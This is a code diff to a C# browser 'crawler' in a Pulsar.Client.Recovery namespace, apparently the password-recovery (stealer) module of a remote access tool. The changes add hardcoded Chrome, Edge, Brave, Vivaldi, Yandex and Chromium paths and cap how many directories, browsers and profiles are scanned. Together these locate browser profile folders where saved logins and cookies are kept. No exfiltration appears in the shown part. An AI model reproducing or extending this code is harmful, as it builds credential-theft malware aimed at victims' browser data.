@@ -15,15 +15,30 @@ namespace Pulsar.Client.Recovery.Crawler
                 @"Opera Software\Opera GX Stable",
             };
 
+        private static readonly string[] knownChromiumBrowserPaths = {
+                @"Google\Chrome",
+                @"Microsoft\Edge",
+                @"BraveSoftware\Brave-Browser",
+                @"Vivaldi",
+                @"Yandex\YandexBrowser",
+                @"Chromium"
+            };
+
         private static string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
         private static string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
         private static List<BrowserChromium> foundChromiumBrowsers = new List<BrowserChromium>();
         private static List<BrowserGecko> foundGeckoBrowsers = new List<BrowserGecko>();
+        private const int MaxDirectories = 4096;
+        private const int MaxChromiumBrowsers = 64;
+        private const int MaxGeckoBrowsers = 32;
+        private const int MaxProfilesPerBrowser = 32;
+        private static int directoryCount;
 
         public static List<AllBrowsers> Start()
         {
             foundChromiumBrowsers.Clear();
             foundGeckoBrowsers.Clear();
+            directoryCount = 0;
 
             string[] rootDirs = { localAppData, appData };
 
@@ -56,6 +71,8 @@ namespace Pulsar.Client.Recovery.Crawler
         private static void SearchDirectory(string directory, List<BrowserChromium> foundChromiumBrowsers, List<BrowserGecko> foundGeckoBrowsers, bool isRoaming, int depth = 0)
         {
             if (depth > 3) return;
+            int visited = System.Threading.Interlocked.Increment(ref directoryCount);
+            if (visited > MaxDirectories) return;
 
             try
             {
@@ -101,7 +118,8 @@ namespace Pulsar.Client.Recovery.Crawler
 
                     var profileDirs = Directory.GetDirectories(userDataPath)
                         .Where(dir => Path.GetFileName(dir).StartsWith("Profile "))
-                        .Select(dir => Path.GetFileName(dir));
+                        .Select(dir => Path.GetFileName(dir))
+                        .Take(MaxProfilesPerBrowser - (profiles.Count > 0 ? 1 : 0));
 
                     foreach (var profile in profileDirs)
                     {
@@ -122,6 +140,8 @@ namespace Pulsar.Client.Recovery.Crawler
                     {
                         lock (foundChromiumBrowsers)
                         {
+                            if (foundChromiumBrowsers.Count >= MaxChromiumBrowsers)
+                                return;
                             foundChromiumBrowsers.Add(new BrowserChromium
                             {
                                 Name = Path.GetFileName(path),
@@ -142,6 +162,8 @@ namespace Pulsar.Client.Recovery.Crawler
                 {
                     lock (foundChromiumBrowsers)
                     {
+                        if (foundChromiumBrowsers.Count >= MaxChromiumBrowsers)
+                            return;
                         foundChromiumBrowsers.Add(new BrowserChromium
                         {
                             Name = Path.GetFileName(path),
@@ -175,6 +197,8 @@ namespace Pulsar.Client.Recovery.Crawler
                             string browserName = Directory.GetParent(path)?.Name + "\\" + Path.GetFileName(path);
                             lock (foundGeckoBrowsers)
                             {
+                                if (foundGeckoBrowsers.Count >= MaxGeckoBrowsers)
+                                    return;
                                 foundGeckoBrowsers.Add(new BrowserGecko
                                 {
                                     Name = browserName,
@@ -196,6 +220,13 @@ namespace Pulsar.Client.Recovery.Crawler
 
         private static void CheckForKnownBrowsers()
         {
+            foreach (var knownPath in knownChromiumBrowserPaths)
+            {
+                string fullPath = Path.Combine(localAppData, knownPath);
+                if (Directory.Exists(fullPath))
+                    CheckForBrowser(fullPath, foundChromiumBrowsers, foundGeckoBrowsers, false);
+            }
+
             foreach (var knownPath in knownBrowserPaths)
             {
                 string fullPath = Path.Combine(appData, knownPath);
